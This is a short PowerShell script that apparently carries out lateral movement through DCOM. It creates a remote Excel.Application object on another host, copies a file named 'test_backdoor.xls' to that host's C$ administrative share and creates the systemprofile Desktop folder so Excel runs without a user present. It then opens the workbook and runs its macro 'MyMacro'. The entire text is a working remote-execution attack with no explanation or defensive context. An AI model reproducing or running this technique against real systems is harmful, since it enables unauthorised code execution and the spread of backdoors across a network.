$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application","172.16.146.5"))

$LocalPath = "C:\Users\administrator.corp\Desktop\test_backdoor.xls"
$RemotePath = "\\172.16.146.5\c$\test_backdoor.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\172.16.146.5\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\test_backdoor.xls")

$com.Run("MyMacro")